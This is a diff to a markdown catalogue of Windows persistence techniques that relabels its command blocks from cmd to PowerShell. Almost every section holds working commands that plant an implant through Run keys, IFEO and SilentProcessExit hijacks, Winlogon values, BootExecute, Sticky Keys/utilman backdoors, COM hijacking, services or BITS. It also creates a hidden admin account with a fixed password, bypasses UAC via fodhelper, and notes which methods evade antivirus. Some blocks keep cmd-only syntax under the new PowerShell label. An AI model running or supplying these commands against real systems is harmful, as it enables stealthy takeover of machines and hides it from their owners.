@@ -157,26 +157,26 @@ dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
 
 Scheduled Task = PC's alarm clock for programs. Set "run this at this time / event" — PC does it automatically. Harder to spot than Startup folder.
 
-```cmd
-REM Create daily task
+```powershell
+# Create daily task
 schtasks /create /tn "DemoTasks\OpenCalc" /sc daily /st 10:00 /tr "{path}"
 
-REM Enumerate all tasks
+# Enumerate all tasks
 schtasks /query /fo LIST /V
 
-REM Specific task
+# Specific task
 schtasks /query /tn "DemoTasks\OpenCalc" /fo LIST /v
 
-REM CSV export
+# CSV export
 schtasks /query /fo CSV /v > tasks.csv
 
-REM Filter running tasks
+# Filter running tasks
 schtasks /query /fo TABLE | findstr "Running"
 
-REM Filter SYSTEM tasks
+# Filter SYSTEM tasks
 schtasks /query /fo LIST /v | findstr /i "system"
 
-REM Cleanup
+# Cleanup
 schtasks /delete /tn "DemoTasks\OpenCalc" /f
 ```
 
@@ -380,14 +380,14 @@ schtasks /delete /tn "WindowsDefenderSync" /f
 
 Legacy Windows task scheduler — deprecated but still present on older systems.
 
-```cmd
-REM Schedule at specific time
+```powershell
+# Schedule at specific time
 at 10:00 /every:M,T,W,Th,F "{path}"
 
-REM List
+# List
 at
 
-REM Delete all
+# Delete all
 at /delete /yes
 ```
 
@@ -398,20 +398,20 @@ at /delete /yes
 
 Classic persistence — runs EXE on every user login. No admin needed for HKCU.
 
-```cmd
-REM Add Run key
+```powershell
+# Add Run key
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate
 
-REM Also check RunOnce
+# Also check RunOnce
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
 
-REM Machine-wide (admin required)
+# Machine-wide (admin required)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f
 
-REM Cleanup
+# Cleanup
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f
 ```
 
@@ -422,14 +422,14 @@ reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v 
 
 Alternative Run key path — often missed by basic AV scans.
 
-```cmd
-REM Add under Explorer policies (less monitored)
+```powershell
+# Add under Explorer policies (less monitored)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v MSUpdate /f
 ```
 
@@ -440,13 +440,13 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
 
 Loads DLL/EXE via the `Load` value under Windows — runs at Explorer startup.
 
-```cmd
+```powershell
 reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /f
 ```
 
@@ -457,14 +457,14 @@ reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /
 
 Runs EXE every time `cmd.exe` opens — persists across any CMD session.
 
-```cmd
-REM Add AutoRun
+```powershell
+# Add AutoRun
 reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Software\Microsoft\Command Processor" /v AutoRun
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f
 ```
 
@@ -475,10 +475,10 @@ reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f
 
 Modifies user environment — can be abused to redirect program execution.
 
-```cmd
+```powershell
 reg add "HKEY_CURRENT_USER\Environment" /v DemoApp /t REG_SZ /d "{path}" /f
 
-REM Cleanup
+# Cleanup
 REG DELETE "HKEY_CURRENT_USER\Environment" /v DemoApp /f
 ```
 
@@ -489,14 +489,14 @@ REG DELETE "HKEY_CURRENT_USER\Environment" /v DemoApp /f
 
 Runs at logon via the `UserInitMprLogonScript` environment variable — no admin needed.
 
-```cmd
-REM Add logon script
+```powershell
+# Add logon script
 reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Environment" /v UserInitMprLogonScript
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
 ```
 
@@ -507,18 +507,18 @@ reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
 
 Routes through a `.bat` file for additional obfuscation layer.
 
-```cmd
-REM Step 1: Create BAT
+```powershell
+# Step 1: Create BAT
 echo {path} > C:\ProgramData\logon.bat
 
-REM Step 2: Set logon script
+# Step 2: Set logon script
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\ProgramData\logon.bat" /f
 
-REM Step 3: Verify
+# Step 3: Verify
 type C:\ProgramData\logon.bat
 reg query "HKCU\Environment" /v UserInitMprLogonScript
 
-REM Step 4: Cleanup
+# Step 4: Cleanup
 reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
 del C:\ProgramData\logon.bat
 ```
@@ -554,14 +554,14 @@ Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\St
 
 Image File Execution Options — runs implant instead of (or before) the target process. Fires on launch of the hijacked EXE.
 
-```cmd
-REM Runs implant every time notepad.exe launches
+```powershell
+# Runs implant every time notepad.exe launches
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f
 ```
 
@@ -572,20 +572,20 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executi
 
 Fires implant when a monitored process **exits** (not launches) — different trigger from standard IFEO.
 
-```cmd
-REM When notepad.exe exits → implant fires
+```powershell
+# When notepad.exe exits → implant fires
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "{path}" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
 
-REM Enable global flag on target process
+# Enable global flag on target process
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
 
-REM Trigger: open and close notepad → payload fires
+# Trigger: open and close notepad → payload fires
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f
 ```
@@ -597,13 +597,13 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executi
 
 Appends implant to `Userinit` — fires at every user login alongside `userinit.exe`.
 
-```cmd
+```powershell
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
 
-REM Restore default
+# Restore default
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
 ```
 
@@ -614,13 +614,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
 
 Replaces/appends to the `Shell` value — runs alongside `explorer.exe` at login.
 
-```cmd
+```powershell
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
 
-REM Restore
+# Restore
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
 ```
 
@@ -631,13 +631,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t
 
 `mpnotify` runs after successful logon — less monitored than Userinit/Shell.
 
-```cmd
+```powershell
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /f
 ```
 
@@ -648,15 +648,15 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnot
 
 Runs once per user on login — uses fake GUID component. Fires for each new user that logs in.
 
-```cmd
-REM Create component
+```powershell
+# Create component
 reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v StubPath /t REG_SZ /d "{path}" /f
 reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v Version /t REG_SZ /d "1,0,0,0" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}"
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /f
 ```
 
@@ -667,11 +667,11 @@ reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}"
 
 Runs before Windows fully loads — early-boot persistence. Extremely stealthy.
 
-```cmd
-REM Add to BootExecute (multi-string)
+```powershell
+# Add to BootExecute (multi-string)
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0{path}" /f
 
-REM Restore default
+# Restore default
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *" /f
 ```
 
@@ -682,13 +682,13 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /
 
 Fires implant on every RDP login — targets remote desktop sessions specifically.
 
-```cmd
+```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /f
 ```
 
@@ -699,17 +699,17 @@ reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RD
 
 Hijacks Sticky Keys (`Shift×5`) or Ease of Access (`Win+U`) on the lock screen — fires at login screen **before** authentication.
 
-```cmd
-REM sethc.exe = Sticky Keys (Shift x5)
+```powershell
+# sethc.exe = Sticky Keys (Shift x5)
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "{path}" /f
 
-REM utilman.exe = Win+U on lock screen
+# utilman.exe = Win+U on lock screen
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "{path}" /f
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
 ```
@@ -721,17 +721,17 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executi
 
 Points screensaver to implant — fires after idle timeout (10 seconds in this config).
 
-```cmd
-REM Set screensaver to implant
+```powershell
+# Set screensaver to implant
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "{path}" /f
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE
 reg query "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut
 reg query "HKCU\Control Panel\Desktop" /v ScreenSaveActive
 
-REM Restore
+# Restore
 reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f
 reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "900" /f
 reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f
@@ -744,19 +744,19 @@ reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f
 
 Drops implant renamed as `.scr` to user-writable path, then points registry to it.
 
-```cmd
-REM Drop implant as .scr
+```powershell
+# Drop implant as .scr
 copy "{path}" "%APPDATA%\scrnsave.scr"
 
-REM Point registry
+# Point registry
 reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%APPDATA%\scrnsave.scr" /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "10" /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
 del "%APPDATA%\scrnsave.scr"
 ```
@@ -768,13 +768,13 @@ del "%APPDATA%\scrnsave.scr"
 
 Overrides the file association handler for `.txt` — implant runs every time a text file is opened.
 
-```cmd
+```powershell
 reg add "HKCU\Software\Classes\txtfile\shell\open\command" /ve /t REG_SZ /d "{path} %1" /f
 
-REM Verify
+# Verify
 reg query "HKCU\Software\Classes\txtfile\shell\open\command"
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Classes\txtfile" /f
 ```
 
@@ -883,17 +883,17 @@ del $HOME\Documents\WindowsPowerShell\profile.ps1
 
 Creates a new Windows service set to auto-start — survives reboots as a system process.
 
-```cmd
-REM Create service
+```powershell
+# Create service
 sc.exe create UpdateService binPath= "{path}" start= auto
 
-REM Query service
+# Query service
 sc.exe query UpdateService
 
-REM Start service
+# Start service
 sc.exe start UpdateService
 
-REM Cleanup
+# Cleanup
 sc.exe delete UpdateService
 ```
 
@@ -904,13 +904,13 @@ sc.exe delete UpdateService
 
 Hijacks an existing service's binary path — blends in with legitimate service list.
 
-```cmd
-REM Change binary of existing service
+```powershell
+# Change binary of existing service
 sc config UpdateService binpath= "{path}"
 sc stop UpdateService
 sc start UpdateService
 
-REM Verify
+# Verify
 sc qc UpdateService
 ```
 
@@ -921,20 +921,20 @@ sc qc UpdateService
 
 Uses Windows Service Recovery Actions — when a service crashes, fires the implant. Stealthy because it looks like a crash recovery mechanism.
 
-```cmd
-REM Create fake service
+```powershell
+# Create fake service
 sc create FakeSvc binPath= "C:\Windows\System32\svchost.exe" start= auto
 
-REM Configure failure action
+# Configure failure action
 sc failure FakeSvc reset= 0 actions= run/0
 sc failureflag FakeSvc 1
 
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc\Parameters" /v FailureCommand /t REG_SZ /d "{path}" /f
 
-REM Trigger (crash the service)
+# Trigger (crash the service)
 sc stop FakeSvc
 
-REM Cleanup
+# Cleanup
 sc delete FakeSvc
 ```
 
@@ -945,17 +945,17 @@ sc delete FakeSvc
 
 Background Intelligent Transfer Service — survives reboot, runs in SYSTEM context, no admin needed.
 
-```cmd
-REM Create BITS job with notification command
+```powershell
+# Create BITS job with notification command
 bitsadmin /create /download PersistJob
 bitsadmin /addnotifycmdline PersistJob "{path}" ""
 bitsadmin /SetNotifyFlags PersistJob 1
 bitsadmin /resume PersistJob
 
-REM Verify
+# Verify
 bitsadmin /list /allusers /verbose
 
-REM Cleanup
+# Cleanup
 bitsadmin /cancel PersistJob
 ```
 
@@ -966,17 +966,17 @@ bitsadmin /cancel PersistJob
 
 Hijacks a Disk Cleanup COM handler via HKCU — HKCU overrides HKLM for COM resolution. No admin needed.
 
-```cmd
+```powershell
 reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /ve /t REG_SZ /d "{path}" /f
 reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
 
-REM Trigger manually
+# Trigger manually
 cleanmgr.exe
 
-REM Verify
+# Verify
 reg query "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}"
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}" /f
 ```
 
@@ -987,17 +987,17 @@ reg delete "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}" 
 
 Fires implant when any application crashes — completely silent to the user.
 
-```cmd
-REM Configure AeDebug to call implant on crash
+```powershell
+# Configure AeDebug to call implant on crash
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /t REG_SZ /d "{path} %ld %ld" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ /d "1" /f
 
-REM Trigger: crash any application → implant fires
+# Trigger: crash any application → implant fires
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug"
 
-REM Cleanup
+# Cleanup
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Debugger /f
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /f
 ```
@@ -1009,8 +1009,8 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /
 
 Application Compatibility Shim — redirects execution when a specific EXE runs. Survives as a registered shim database.
 
-```cmd
-REM Step 1: Create shim XML
+```powershell
+# Step 1: Create shim XML
 echo ^<?xml version="1.0"?^> > evil.xml
 echo ^<DATABASE^> >> evil.xml
 echo ^<APP NAME="EvilShim" VENDOR="MS"^> >> evil.xml
@@ -1020,14 +1020,14 @@ echo ^</EXE^> >> evil.xml
 echo ^</APP^> >> evil.xml
 echo ^</DATABASE^> >> evil.xml
 
-REM Step 2: Compile shim (requires sdb-explorer or custom tooling)
-REM Step 3: Install shim
+# Step 2: Compile shim (requires sdb-explorer or custom tooling)
+# Step 3: Install shim
 sdbinst.exe evil.sdb
 
-REM Verify
+# Verify
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
 
-REM Cleanup
+# Cleanup
 sdbinst.exe -u evil.sdb
 ```
 
@@ -1081,20 +1081,20 @@ Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | 
 
 Creates a backdoor admin account and hides it from the login screen via registry.
 
-```cmd
-REM Create hidden admin user
+```powershell
+# Create hidden admin user
 net user WinlogonService Password123 /add
 net localgroup "Administrators" /add WinlogonService
 net localgroup "Remote Desktop Users" /add WinlogonService
 
-REM Hide from login screen
+# Hide from login screen
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WinlogonService /t REG_DWORD /d 0 /f
 
-REM Verify
+# Verify
 net user WinlogonService
 net localgroup "Administrators"
 
-REM Cleanup
+# Cleanup
 net user WinlogonService /del
 ```
 
@@ -1105,18 +1105,18 @@ net user WinlogonService /del
 
 Bypasses UAC silently using `fodhelper.exe` — elevates to HIGH integrity without a UAC prompt.
 
-```cmd
-REM Step 1: Set registry trigger
+```powershell
+# Step 1: Set registry trigger
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "{path}" /f
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
 
-REM Step 2: Launch fodhelper — triggers your payload at HIGH integrity
+# Step 2: Launch fodhelper — triggers your payload at HIGH integrity
 start C:\Windows\System32\fodhelper.exe
 
-REM Step 3: Verify elevated process
+# Step 3: Verify elevated process
 whoami /groups | findstr "High"
 
-REM Cleanup
+# Cleanup
 reg delete "HKCU\Software\Classes\ms-settings" /f
 ```
 
